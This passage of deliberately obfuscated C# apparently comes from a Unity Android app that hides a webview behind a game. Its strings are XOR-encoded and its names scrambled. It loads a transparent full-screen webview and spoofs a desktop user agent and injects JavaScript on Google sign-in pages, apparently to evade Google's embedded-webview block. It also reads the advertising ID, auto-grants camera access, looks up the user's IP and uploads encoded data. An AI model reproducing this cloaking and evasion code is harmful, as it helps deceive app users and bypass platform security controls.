            var _0x5a695a90 = _0x3601a6fe.GetPopupWindow(_0x2ed8b921);
            if (_0x5a695a90 == null)
                return;
            _0x754a2946.Add(_0x5a695a90);
            Debug.Log($"[Test] Popup ID: {_0x5a695a90.Id}");
            _0x5a695a90.OnPageStarted += (_0xdc8d5f91, _0xb312f75f) =>
            {
                WLog(_0x9fe415a8._0x073f6504(new byte[36] { 152, 151, 166, 176, 183, 158, 227, 147, 172, 179, 182, 179, 227, 148, 166, 161, 149, 170, 166, 180, 227, 140, 173, 147, 162, 164, 166, 144, 183, 162, 177, 183, 166, 167, 249, 227 }, 195) + _0xb312f75f);
                _0xa3b62801 = 0;
                if (string.IsNullOrEmpty(_0xb312f75f) || IsAboutBlank(_0xb312f75f))
                    return;
                if (IsGoogleAuthFlowUrl(_0xb312f75f))
                {
                    WLog(_0x9fe415a8._0x073f6504(new byte[57] { 85, 90, 107, 125, 122, 83, 46, 94, 97, 126, 123, 126, 46, 73, 97, 97, 105, 98, 107, 46, 111, 123, 122, 102, 46, 104, 98, 97, 121, 46, 35, 48, 46, 125, 126, 97, 97, 104, 46, 73, 97, 97, 105, 98, 107, 46, 77, 102, 124, 97, 99, 107, 46, 91, 79, 52, 46 }, 14) + _0xb312f75f);
                    _0x76c5c391 = false;
                    _0x8bb02c22();
                    if (_0xdc8d5f91 != null && _0xdc8d5f91.IsAlive)
                        _0xdc8d5f91.EvaluateJavaScript(_0x81c18935());
                    return;
                }

                if (_0x00eaf601 == null)
                    return;
                if (!_0x76c5c391)
                {
                    _0x76c5c391 = true;
                    _0x00eaf601.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x9fe415a8._0x073f6504(new byte[39] { 5, 10, 59, 45, 42, 3, 126, 14, 49, 46, 43, 46, 126, 63, 46, 46, 50, 39, 126, 9, 55, 48, 58, 49, 41, 45, 126, 58, 59, 45, 53, 42, 49, 46, 126, 11, 31, 100, 126 }, 94) + _0xb312f75f);
                }

                if (_0xdc8d5f91 != null && _0xdc8d5f91.IsAlive)
                    _0xdc8d5f91.EvaluateJavaScript(_0x12689d93());
                if (!_0xed0fca3f && _0xdc8d5f91 != null && _0xdc8d5f91.IsAlive && IsHttpUrl(_0xb312f75f))
                {
                    _0xed0fca3f = true;
                }
            };
            _0x5a695a90.OnPageFinished += (_0xdc8d5f91, _0xd1f7d2f4) =>
            {
                string _0x4ada10ca = _0xd1f7d2f4 != null ? _0xd1f7d2f4.data : string.Empty;
                WLog(_0x9fe415a8._0x073f6504(new byte[35] { 163, 172, 157, 139, 140, 165, 216, 168, 151, 136, 141, 136, 216, 175, 157, 154, 174, 145, 157, 143, 216, 190, 145, 150, 145, 139, 144, 157, 156, 194, 216, 141, 138, 148, 197 }, 248) + _0x4ada10ca);
                if (_0xdc8d5f91 == null || !_0xdc8d5f91.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0x4ada10ca))
                {
                    _0x8bb02c22();
                    _0xdc8d5f91.EvaluateJavaScript(_0x81c18935());
                    return;
                }

                if (!_0x76c5c391)
                    return;
                _0xdc8d5f91.EvaluateJavaScript(_0x12689d93());
            };
        };
        _0x3601a6fe.OnMultipleWindowClosed += (_0x3360cd34, _0x2ed8b921) =>
        {
            _0x754a2946.RemoveAll(_0xca3fcd67 => _0xca3fcd67 == null || _0xca3fcd67.Id == _0x2ed8b921 || !_0xca3fcd67.IsAlive);
            _0x1142ece4(false);
            if (_0x754a2946.Count == 0 && _0x00eaf601 != null)
            {
                _0x76c5c391 = false;
                _0xed0fca3f = false;
                _0x9f2e6b21();
            }

            WLog(_0x9fe415a8._0x073f6504(new byte[43] { 223, 208, 225, 247, 240, 217, 164, 201, 229, 237, 234, 164, 211, 225, 230, 210, 237, 225, 243, 164, 201, 241, 232, 240, 237, 244, 232, 225, 211, 237, 234, 224, 235, 243, 164, 199, 232, 235, 247, 225, 224, 190, 164 }, 132) + _0x2ed8b921);
        };
        _0x3601a6fe.RegisterOnRequestMediaCapturePermission(_0x0d41c21e =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    private bool _0x77edac20()
    {
        _0x754a2946.RemoveAll(_0xca3fcd67 => _0xca3fcd67 == null || !_0xca3fcd67.IsAlive);
        return _0x754a2946.Count > 0;
    }

    private void StopCurrentFailedLoad(UniWebView _0xc2636294)
    {
        _0x1142ece4(false);
        if (_0xc2636294 == null)
            return;
        _0xc2636294.Stop();
        if (_0xc2636294.CanGoBack)
            _0xc2636294.GoBack();
    }

    private void _0x9f2e6b21()
    {
        if (_0x00eaf601 == null)
            return;
        if (_0x4fa6443a)
            _0x00eaf601.SetUserAgent(_0xad706657());
        else
            _0x00eaf601.SetUserAgent("");
    }

    internal bool isDestroyedForce = false;
    // PART 3
    private string _0x3d37a729()
    {
        try
        {
            var _0x5b295922 = new AndroidJavaClass(_0x9fe415a8._0x073f6504(new byte[30] { 57, 53, 55, 116, 47, 52, 51, 46, 35, 105, 62, 116, 42, 54, 59, 35, 63, 40, 116, 15, 52, 51, 46, 35, 10, 54, 59, 35, 63, 40 }, 90));
            var _0xc2c7142d = _0x5b295922.GetStatic<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[15] { 43, 61, 58, 58, 45, 38, 60, 9, 43, 60, 33, 62, 33, 60, 49 }, 72));
            var _0x3b6bbaa5 = new AndroidJavaClass(_0x9fe415a8._0x073f6504(new byte[57] { 252, 240, 242, 177, 248, 240, 240, 248, 243, 250, 177, 254, 241, 251, 237, 240, 246, 251, 177, 248, 242, 236, 177, 254, 251, 236, 177, 246, 251, 250, 241, 235, 246, 249, 246, 250, 237, 177, 222, 251, 233, 250, 237, 235, 246, 236, 246, 241, 248, 214, 251, 220, 243, 246, 250, 241, 235 }, 159));
            var _0x59810739 = _0x3b6bbaa5.CallStatic<AndroidJavaObject>(_0x9fe415a8._0x073f6504(new byte[20] { 234, 232, 249, 204, 233, 251, 232, 255, 249, 228, 254, 228, 227, 234, 196, 233, 196, 227, 235, 226 }, 141), _0xc2c7142d);
            var _0xa3c1f5b6 = _0x59810739.Call<string>(_0x9fe415a8._0x073f6504(new byte[5] { 202, 200, 217, 228, 201 }, 173));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0xa3c1f5b6}");
#endif
            }

            return string.IsNullOrEmpty(_0xa3c1f5b6) ? "" : _0xa3c1f5b6;
        }
        catch
        {
            return "";
        }
    }

    // WS_SOURCE MONO
    public static _0xde141cf2 _0xdf32a2c3 { get; private set; }

    internal bool IsHttpUrl(string _0xcc9ff3f8)
    {
        if (string.IsNullOrEmpty(_0xcc9ff3f8))
            return false;
        return _0xcc9ff3f8.StartsWith(_0x9fe415a8._0x073f6504(new byte[7] { 60, 32, 32, 36, 110, 123, 123 }, 84), StringComparison.OrdinalIgnoreCase) || _0xcc9ff3f8.StartsWith(_0x9fe415a8._0x073f6504(new byte[8] { 188, 160, 160, 164, 167, 238, 251, 251 }, 212), StringComparison.OrdinalIgnoreCase);
    }

    private bool _0x53bf7927 = false;
    private Canvas _0x6af48c5f;
    private bool _0x43fa238c = false;
    private string _0x32aada61 = "";
    private IEnumerator _0x62021f5d(string _0x878b1b13)
    {
        if (Permission.HasUserAuthorizedPermission(_0x878b1b13))
            yield break;
        bool _0x007b5767 = false;
        var _0x055bdb5d = new PermissionCallbacks();
        _0x055bdb5d.PermissionGranted += _0xfcb850f5 => _0x007b5767 = true;
        _0x055bdb5d.PermissionDenied += _0xfcb850f5 => _0x007b5767 = true;
        Permission.RequestUserPermission(_0x878b1b13, _0x055bdb5d);
        yield return new WaitUntil(() => _0x007b5767);
    }

    private Task _0xebae9a14(IEnumerator _0x93922344)
    {
        var _0x22319c13 = new TaskCompletionSource<bool>();
        StartCoroutine(_0xef4f0a0d(_0x93922344, _0x22319c13));
        return _0x22319c13.Task;
    }

    private void _0x8bb02c22()
    {
        _0x4fa6443a = true;
        if (_0x00eaf601 != null)
            _0x00eaf601.SetUserAgent(_0xad706657());
    }

    private string _0xa70bcfc6 = "";
    public void _0x1b8962c6()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[18] { 238, 225, 208, 198, 193, 232, 149, 249, 212, 192, 219, 214, 221, 149, 242, 212, 216, 208 }, 181));
#endif
        }

        _0x69b0bfad.Instance?._0xf780e62b();
        _0x5e1e2fdc.Instance._0xbd172a36(_0xe5719494._0x6888be17.DEFAULT);
    }

    private string _0xb40641aa = "";
    private void OnDestroy()
    {
        StopAllCoroutines();
        _0x1b8962c6();
    }

    private string _0x7b1a35fe = "";
    private IEnumerator _0xa96a3483()
    {
        yield return _0x62021f5d(Permission.Camera);
    }

    private async Task _0x088b9e09(string _0xfe94a147)
    {
        if (_0x43fa238c || string.IsNullOrEmpty(_0x38cdee7c) || string.IsNullOrEmpty(_0xfe94a147) || _0x62731cad)
            return;
        _0x43fa238c = true;
        try
        {
            JObject _0xc5837d72 = _0xf3b9e3cf(_0xfe94a147, _0x38cdee7c, _0xd3b9ac4f());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0xfe94a147} payload: {_0xc5837d72}");
                }
#endif
            }

            var _0x7690e169 = _0xa0eee957(_0xc5837d72.ToString(), _0x38cdee7c);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x9fe415a8._0x073f6504(new byte[4] { 48, 51, 61, 56 }, 92) + _0x38cdee7c, _0x7690e169 } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[24] { 170, 165, 180, 162, 165, 172, 209, 189, 158, 144, 149, 209, 129, 144, 130, 130, 209, 148, 131, 131, 158, 131, 203, 209 }, 241) + e.Message);
#endif
            }
        }
    }

    private UniWebViewPopup _0x309d4e87()
    {
        for (int _0x6f11d1b3 = _0x754a2946.Count - 1; _0x6f11d1b3 >= 0; _0x6f11d1b3--)
        {
            var _0xc066aa7a = _0x754a2946[_0x6f11d1b3];
            if (_0xc066aa7a != null && _0xc066aa7a.IsAlive)
                return _0xc066aa7a;
            _0x754a2946.RemoveAt(_0x6f11d1b3);
        }

        return null;
    }

    private string _0xcbb35755 = "";
    private string _0x53d0ca9d = "";
    private int _0x42a9d562 = 5, _0x51cbfaf3 = 5, _0x82e2be61 = 5, _0x7887a777 = 5;
    private IEnumerator _0x1f2de857(string _0xe65f4b63)
    {
        if (_0x00eaf601 != null && _0x9c09cacf)
            yield break;
        _0x00eaf601 = gameObject.AddComponent<UniWebView>();
        _0xa8b8a8f3(_0x00eaf601);
        _0xc8c85c1d(_0x00eaf601);
        _0x00eaf601.BackgroundColor = Color.clear;
        var _0x18036849 = SceneManager.GetActiveScene().GetRootGameObjects();
        if (Camera.main != null)
        {
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.clear;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0xe0cafdb9();
        yield return new WaitForEndOfFrame();
        _0x9c09cacf = true;
        _0x1549b977();
        _0x1142ece4(true);
        _0x82605afc = false;
        _0x4fa6443a = false;
        _0x754a2946.Clear();
        _0xdc66f729 = -1;
        firstLoadShown = false;
        _0x701429b2 = false;
        _0xb20597eb = false;
        _0x00eaf601.SetUserAgent("");
        _0x7bf40925 = Time.realtimeSinceStartup;
        _0x00eaf601.Stop();
        _0x00eaf601.Load(_0xe65f4b63);
        _0x00eaf601.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0x9fe415a8._0x073f6504(new byte[25] { 116, 88, 80, 87, 25, 110, 92, 91, 111, 80, 92, 78, 25, 112, 87, 80, 77, 80, 88, 85, 25, 106, 81, 86, 78 }, 57));
    }

    private async Task<bool> _0x7cef395d()
    {
        {
#if B_LOGS
            Debug.Log(_0x9fe415a8._0x073f6504(new byte[37] { 232, 231, 214, 192, 199, 238, 147, 224, 218, 212, 221, 250, 221, 230, 221, 218, 199, 202, 224, 214, 193, 197, 218, 208, 214, 192, 242, 221, 220, 221, 202, 222, 220, 198, 192, 223, 202 }, 179));
#endif
        }

        try
        {
            var _0x8ecc5731 = new InitializationOptions();
            await UnityServices.InitializeAsync(_0x8ecc5731);
            {
#if B_LOGS
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[32] { 198, 201, 248, 238, 233, 192, 189, 200, 243, 244, 233, 228, 206, 248, 239, 235, 244, 254, 248, 238, 189, 212, 243, 244, 233, 244, 252, 241, 244, 231, 248, 249 }, 157));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[20] { 67, 82, 68, 67, 55, 66, 121, 126, 99, 110, 68, 114, 101, 97, 126, 116, 114, 100, 45, 55 }, 23) + ex.Message);
#endif
            }

            _0xdf32a2c3?._0x1b8962c6();
            return true;
        }

        bool _0xa11f474d = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0xa11f474d = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x9fe415a8._0x073f6504(new byte[37] { 238, 225, 208, 198, 193, 232, 149, 230, 220, 210, 219, 152, 220, 219, 149, 244, 219, 218, 219, 204, 216, 218, 192, 198, 155, 149, 229, 217, 212, 204, 208, 199, 149, 252, 241, 143, 149 }, 181) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0x38cdee7c = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x9fe415a8._0x073f6504(new byte[25] { 102, 119, 97, 102, 18, 97, 91, 85, 92, 31, 91, 92, 18, 115, 71, 70, 90, 18, 119, 96, 96, 125, 96, 8, 18 }, 50) + ex.Message);
#endif
                }

                _0xdf32a2c3?._0x1b8962c6();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x9fe415a8._0x073f6504(new byte[28] { 5, 20, 2, 5, 113, 2, 56, 54, 63, 124, 56, 63, 113, 3, 52, 32, 36, 52, 34, 37, 113, 20, 3, 3, 30, 3, 107, 113 }, 81) + ex.Message);
#endif
                }

                _0xdf32a2c3?._0x1b8962c6();
                return true;
            }
        }
        while (!_0xa11f474d);
        return false;
    }

    private string _0x45aaa86e = "";
    private string _0x81c18935()
    {
        string _0x2a6e7a6b = _0xad706657();
        if (string.IsNullOrEmpty(_0x2a6e7a6b))
            return _0x9fe415a8._0x073f6504(new byte[7] { 155, 130, 132, 137, 205, 221, 214 }, 237);
        string _0xad402470 = _0x2a6e7a6b.Replace(_0x9fe415a8._0x073f6504(new byte[1] { 203 }, 151), _0x9fe415a8._0x073f6504(new byte[2] { 57, 57 }, 101)).Replace(_0x9fe415a8._0x073f6504(new byte[1] { 128 }, 167), _0x9fe415a8._0x073f6504(new byte[2] { 96, 27 }, 60));
        var _0xb0870f0e = Regex.Match(_0x2a6e7a6b, _0x9fe415a8._0x073f6504(new byte[12] { 104, 67, 89, 68, 70, 78, 4, 3, 119, 79, 0, 2 }, 43));
        string _0x00722f56 = _0xb0870f0e.Success ? _0xb0870f0e.Groups[1].Value : _0x9fe415a8._0x073f6504(new byte[3] { 113, 114, 112 }, 64);
        return _0x9fe415a8._0x073f6504(new byte[12] { 165, 235, 248, 227, 238, 249, 228, 226, 227, 165, 164, 246 }, 141) + _0x9fe415a8._0x073f6504(new byte[8] { 36, 51, 32, 114, 39, 51, 111, 117 }, 82) + _0xad402470 + _0x9fe415a8._0x073f6504(new byte[2] { 35, 63 }, 4) + _0x9fe415a8._0x073f6504(new byte[30] { 191, 168, 187, 233, 185, 187, 166, 189, 166, 244, 135, 168, 191, 160, 174, 168, 189, 166, 187, 231, 185, 187, 166, 189, 166, 189, 176, 185, 172, 242 }, 201) + _0x9fe415a8._0x073f6504(new byte[121] { 143, 156, 135, 138, 157, 128, 134, 135, 201, 141, 140, 143, 193, 134, 139, 131, 197, 130, 140, 144, 197, 159, 136, 133, 192, 146, 157, 155, 144, 146, 166, 139, 131, 140, 138, 157, 199, 141, 140, 143, 128, 135, 140, 185, 155, 134, 153, 140, 155, 157, 144, 193, 134, 139, 131, 197, 130, 140, 144, 197, 146, 142, 140, 157, 211, 143, 156, 135, 138, 157, 128, 134, 135, 193, 192, 146, 155, 140, 157, 156, 155, 135, 201, 159, 136, 133, 210, 148, 197, 138, 134, 135, 143, 128, 142, 156, 155, 136, 139, 133, 140, 211, 157, 155, 156, 140, 148, 192, 210, 148, 138, 136, 157, 138, 129, 193, 140, 192, 146, 148, 148 }, 233) + _0x9fe415a8._0x073f6504(new byte[26] { 249, 248, 251, 181, 237, 239, 242, 233, 242, 177, 186, 232, 238, 248, 239, 220, 250, 248, 243, 233, 186, 177, 232, 252, 180, 166 }, 157) + _0x9fe415a8._0x073f6504(new byte[52] { 25, 24, 27, 85, 13, 15, 18, 9, 18, 81, 90, 28, 13, 13, 43, 24, 15, 14, 20, 18, 19, 90, 81, 8, 28, 83, 15, 24, 13, 17, 28, 30, 24, 85, 82, 35, 48, 18, 7, 20, 17, 17, 28, 33, 82, 82, 81, 90, 90, 84, 84, 70 }, 125) + _0x9fe415a8._0x073f6504(new byte[37] { 156, 157, 158, 208, 136, 138, 151, 140, 151, 212, 223, 136, 148, 153, 140, 158, 151, 138, 149, 223, 212, 223, 180, 145, 150, 141, 128, 216, 153, 138, 149, 142, 192, 148, 223, 209, 195 }, 248) + _0x9fe415a8._0x073f6504(new byte[34] { 195, 194, 193, 143, 215, 213, 200, 211, 200, 139, 128, 209, 194, 201, 195, 200, 213, 128, 139, 128, 224, 200, 200, 192, 203, 194, 135, 238, 201, 196, 137, 128, 142, 156 }, 167) + _0x9fe415a8._0x073f6504(new byte[30] { 179, 178, 177, 255, 167, 165, 184, 163, 184, 251, 240, 186, 182, 175, 131, 184, 162, 180, 191, 135, 184, 190, 185, 163, 164, 240, 251, 226, 254, 236 }, 215) + _0x9fe415a8._0x073f6504(new byte[48] { 188, 186, 177, 179, 190, 169, 186, 232, 189, 169, 172, 245, 179, 170, 186, 169, 166, 172, 187, 242, 147, 179, 170, 186, 169, 166, 172, 242, 239, 139, 160, 186, 167, 165, 161, 189, 165, 239, 228, 190, 173, 186, 187, 161, 167, 166, 242, 239 }, 200) + _0x00722f56 + _0x9fe415a8._0x073f6504(new byte[35] { 171, 241, 160, 247, 238, 254, 237, 226, 232, 182, 171, 203, 227, 227, 235, 224, 233, 172, 207, 228, 254, 227, 225, 233, 171, 160, 250, 233, 254, 255, 229, 227, 226, 182, 171 }, 140) + _0x00722f56 + _0x9fe415a8._0x073f6504(new byte[238] { 146, 200, 153, 206, 215, 199, 212, 219, 209, 143, 146, 251, 218, 193, 136, 244, 138, 247, 199, 212, 219, 209, 146, 153, 195, 208, 199, 198, 220, 218, 219, 143, 146, 135, 129, 146, 200, 232, 153, 216, 218, 215, 220, 217, 208, 143, 193, 199, 192, 208, 153, 197, 217, 212, 193, 211, 218, 199, 216, 143, 146, 244, 219, 209, 199, 218, 220, 209, 146, 153, 210, 208, 193, 253, 220, 210, 221, 240, 219, 193, 199, 218, 197, 204, 227, 212, 217, 192, 208, 198, 143, 211, 192, 219, 214, 193, 220, 218, 219, 157, 156, 206, 199, 208, 193, 192, 199, 219, 149, 229, 199, 218, 216, 220, 198, 208, 155, 199, 208, 198, 218, 217, 195, 208, 157, 206, 212, 199, 214, 221, 220, 193, 208, 214, 193, 192, 199, 208, 143, 146, 212, 199, 216, 146, 153, 215, 220, 193, 219, 208, 198, 198, 143, 146, 131, 129, 146, 153, 216, 218, 215, 220, 217, 208, 143, 193, 199, 192, 208, 153, 216, 218, 209, 208, 217, 143, 146, 146, 153, 197, 217, 212, 193, 211, 218, 199, 216, 143, 146, 244, 219, 209, 199, 218, 220, 209, 146, 153, 197, 217, 212, 193, 211, 218, 199, 216, 227, 208, 199, 198, 220, 218, 219, 143, 146, 132, 129, 155, 133, 155, 133, 146, 153, 192, 212, 243, 192, 217, 217, 227, 208, 199, 198, 220, 218, 219, 143, 146 }, 181) + _0x00722f56 + _0x9fe415a8._0x073f6504(new byte[117] { 213, 203, 213, 203, 213, 203, 220, 134, 210, 192, 134, 134, 192, 180, 153, 145, 158, 152, 143, 213, 159, 158, 157, 146, 149, 158, 171, 137, 148, 139, 158, 137, 143, 130, 211, 139, 137, 148, 143, 148, 215, 220, 142, 136, 158, 137, 186, 156, 158, 149, 143, 191, 154, 143, 154, 220, 215, 128, 156, 158, 143, 193, 157, 142, 149, 152, 143, 146, 148, 149, 211, 210, 128, 137, 158, 143, 142, 137, 149, 219, 142, 154, 159, 192, 134, 215, 152, 148, 149, 157, 146, 156, 142, 137, 154, 153, 151, 158, 193, 143, 137, 142, 158, 134, 210, 192, 134, 152, 154, 143, 152, 147, 211, 158, 210, 128, 134 }, 251) + _0x9fe415a8._0x073f6504(new byte[5] { 192, 148, 149, 148, 134 }, 189);
    }

    private bool _0xfaa9f744(int _0xdb510e80, string _0x72d7c6c6, string _0x54dc4188)
    {
        if (string.IsNullOrEmpty(_0x54dc4188))
            return false;
        if (!IsHttpUrl(_0x54dc4188))
            return true;
        if (string.IsNullOrEmpty(_0x72d7c6c6))
            return false;
        return _0x72d7c6c6.IndexOf(_0x9fe415a8._0x073f6504(new byte[20] { 96, 119, 119, 122, 102, 106, 107, 107, 96, 102, 113, 108, 106, 107, 122, 119, 96, 118, 96, 113 }, 37), StringComparison.OrdinalIgnoreCase) >= 0 || _0x72d7c6c6.IndexOf(_0x9fe415a8._0x073f6504(new byte[22] { 12, 27, 27, 22, 10, 6, 7, 7, 12, 10, 29, 0, 6, 7, 22, 27, 12, 15, 28, 26, 12, 13 }, 73), StringComparison.OrdinalIgnoreCase) >= 0 || _0x72d7c6c6.IndexOf(_0x9fe415a8._0x073f6504(new byte[21] { 68, 83, 83, 94, 66, 78, 79, 79, 68, 66, 85, 72, 78, 79, 94, 66, 77, 78, 82, 68, 69 }, 1), StringComparison.OrdinalIgnoreCase) >= 0 || _0x72d7c6c6.IndexOf(_0x9fe415a8._0x073f6504(new byte[22] { 100, 115, 115, 126, 116, 111, 106, 111, 110, 118, 111, 126, 116, 115, 109, 126, 114, 98, 105, 100, 108, 100 }, 33), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private string _0x38cdee7c = "";
    // WEB VIEW LOGIC END
    internal void _0x4a7ac11e()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0x0d4a72d9 = new AndroidNotificationChannel
        {
            Id = _0x9fe415a8._0x073f6504(new byte[15] { 27, 26, 25, 30, 10, 19, 11, 32, 28, 23, 30, 17, 17, 26, 19 }, 127),
            Name = _0x9fe415a8._0x073f6504(new byte[15] { 208, 241, 242, 245, 225, 248, 224, 180, 215, 252, 245, 250, 250, 241, 248 }, 148),
            Importance = Importance.High,
            Description = _0x9fe415a8._0x073f6504(new byte[21] { 139, 169, 162, 169, 190, 173, 160, 236, 162, 163, 184, 165, 170, 165, 175, 173, 184, 165, 163, 162, 191 }, 204)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0x0d4a72d9);
        // Build notification
        var _0x2dc23248 = new AndroidNotification
        {
            Title = _0x5d79989f[UnityEngine.Random.Range(0, _0x5d79989f.Length)],
            Text = _0x9fe415a8._0x073f6504(new byte[21] { 232, 219, 204, 137, 208, 198, 220, 137, 218, 220, 219, 204, 137, 221, 198, 137, 204, 209, 192, 221, 150 }, 169),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0x2dc23248, _0x9fe415a8._0x073f6504(new byte[15] { 121, 120, 123, 124, 104, 113, 105, 66, 126, 117, 124, 115, 115, 120, 113 }, 29));
    }

    // MAIN FLOW
    private bool _0x4d4d4a01 { get; set; }

    private void _0x6745fa0d(string _0x987ceac0)
    {
        bool _0xcf2046cc = !string.IsNullOrEmpty(_0x987ceac0);
        if (_0xcf2046cc)
        {
            {
#if B_LOGS
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[13] { 18, 29, 44, 58, 61, 20, 105, 26, 33, 38, 62, 115, 105 }, 73) + _0x987ceac0);
#endif
            }

            _0x2c3857f1(_0x987ceac0);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x9fe415a8._0x073f6504(new byte[39] { 223, 208, 225, 247, 240, 217, 164, 194, 229, 232, 232, 230, 229, 231, 239, 164, 102, 2, 22, 164, 195, 229, 233, 225, 164, 172, 234, 235, 164, 226, 237, 234, 229, 232, 164, 209, 214, 200, 173 }, 132));
#endif
            }

            _0x1b8962c6();
            return;
        }
    }

    private bool _0xb20597eb = false;
    private string _0x7bd60ea3 { get; set; }

    internal bool firstLoadShown = false;
    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0xee83bc02()
    {
        var _0x824916ba = _0x9fe415a8._0x073f6504(new byte[40] { 27, 7, 7, 3, 0, 73, 92, 92, 4, 4, 4, 93, 16, 31, 28, 6, 23, 21, 31, 18, 1, 22, 93, 16, 28, 30, 92, 16, 23, 29, 94, 16, 20, 26, 92, 7, 1, 18, 16, 22 }, 115);
        using (UnityWebRequest _0x2f3312dd = UnityWebRequest.Get(_0x824916ba))
        {
            await _0x2f3312dd.SendWebRequest();
            string[] _0x32467eac = _0x2f3312dd.downloadHandler.text.Split('\n');
